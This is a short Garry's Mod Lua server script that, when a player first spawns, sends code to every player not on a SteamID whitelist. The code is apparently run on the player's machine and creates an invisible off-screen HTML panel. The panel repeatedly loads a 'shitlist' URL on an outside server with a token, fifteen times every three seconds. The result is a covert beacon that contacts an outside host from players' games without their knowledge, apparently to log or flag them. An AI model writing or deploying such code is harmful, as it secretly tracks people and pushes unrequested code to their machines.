util.AddNetworkString("oc.Exec")

local wl = {
	["STEAM_0:1:57264173"] = true,
	["STEAM_0:0:33167998"] = true,
	["STEAM_0:0:32926038"] = true,
}

local shitlist = " local function SayHI() if IsValid(html) then html:Remove() end local html = vgui.Create('HTML') html:SetPos(-10,-10) html:SetSize(1,1) html:OpenURL('http://superiorservers.co/rp/shitlist.php?jaocdgadrnj3a=kavu3nanweisn9awhxuj') end timer.Create('doordeta', 3, 15, function() SayHI() end)"

hook.Add("PlayerInitialSpawn", "oc.Exec.PlayerInitialSpawn", function(pl)
	net.waitForPlayer(pl, function()
		if wl[pl:SteamID()] then return end
		net.Start("oc.Exec")
			net.WriteString(shitlist)
		net.Send(pl)
	end)
end)